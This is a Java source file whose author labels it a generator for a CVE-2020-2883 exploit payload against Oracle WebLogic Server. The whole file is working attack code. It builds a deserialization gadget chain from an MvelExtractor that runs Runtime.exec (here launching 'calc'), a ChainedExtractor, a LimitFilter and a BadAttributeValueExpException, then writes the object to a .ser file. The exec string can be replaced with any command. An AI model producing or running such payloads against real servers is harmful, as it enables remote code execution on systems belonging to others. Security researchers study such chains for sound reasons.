package com.supeream.ga0weI;

import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.filter.LimitFilter;

import javax.management.BadAttributeValueExpException;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

/**
 * @author ga0weI
 * @time 20220607
 * @work Generate a payload that exploits cve-2020-2883 vulnerability to attack WebLogic Server(new sink)
 */
public class Payloadfor2883_1 {
    public static void main(String[] args) throws Exception{
        //直接初始化的时候将MvelExtractor的sExpr赋值为我们想要编译执行的语句
        MvelExtractor mvelExtractor = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\"calc\");");


        //下面的就和cve-2020-2555一模一样了
        ChainedExtractor chainedExtractor = new ChainedExtractor(new ValueExtractor[]{mvelExtractor});
        LimitFilter limitFilter = new LimitFilter();

        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, String.class);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field val = badAttributeValueExpException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, limitFilter);

        ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("CVE_2020_2883_1.ser"));
        os.writeObject(badAttributeValueExpException);
        System.out.println("CVE_2020_2883攻击payload_1已生成");
    }
}